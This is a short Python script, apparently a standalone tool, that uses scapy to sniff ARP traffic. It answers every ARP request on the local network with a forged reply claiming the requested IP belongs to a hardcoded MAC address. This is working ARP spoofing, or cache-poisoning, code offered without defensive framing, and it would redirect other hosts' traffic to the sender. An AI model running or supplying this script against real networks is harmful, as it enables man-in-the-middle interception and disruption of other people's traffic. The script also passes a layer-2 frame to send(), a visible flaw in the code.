from scapy.all import sniff, ARP, send
from scapy.layers.l2 import Ether
from scapy.packet import Packet
from enum import Enum

MAC_ADDRESS = "74:da:38:ea:8f:0b"


class ArpType(Enum):
    REQUEST = 1
    REPLY = 2


def is_arp_request(packet: Packet) -> bool:
    return packet.haslayer(ARP) and packet[ARP].op == ArpType.REQUEST.value


def is_arp_reply(packet: Packet) -> bool:
    return packet.haslayer(ARP) and packet[ARP].op == ArpType.REPLY.value


def build_arp_msg(arp_type: ArpType, src_mac: str, src_ip: str, dst_mac: str, dst_ip: str) -> ARP:
    return ARP(op=arp_type.value, hwsrc=src_mac, psrc=src_ip, hwdst=dst_mac, pdst=dst_ip, )


def handle_arp_packet(packet: Packet) -> None:
    if is_arp_reply(packet):
        print(f"ARP Reply from {packet[ARP].psrc} ({packet[ARP].hwsrc}) asking for {packet[ARP].pdst}")
        return

    if is_arp_request(packet):
        print(f"ARP Request from {packet[ARP].psrc} ({packet[ARP].hwsrc}) asking for {packet[ARP].pdst}")

        reply: ARP = build_arp_msg(ArpType.REPLY, MAC_ADDRESS, packet[ARP].pdst, packet[ARP].hwsrc, packet[ARP].psrc)
        ethernet_frame = Ether(dst=reply.hwdst, src=MAC_ADDRESS) / reply
        send(ethernet_frame, verbose=False)

        print(f"Sent ARP Reply: {reply.psrc} is at {reply.hwsrc}")


print("Listening for ARP requests/replies and responding...")
print("-----------------------------------------------------")
sniff(filter="arp", prn=handle_arp_packet, store=False)
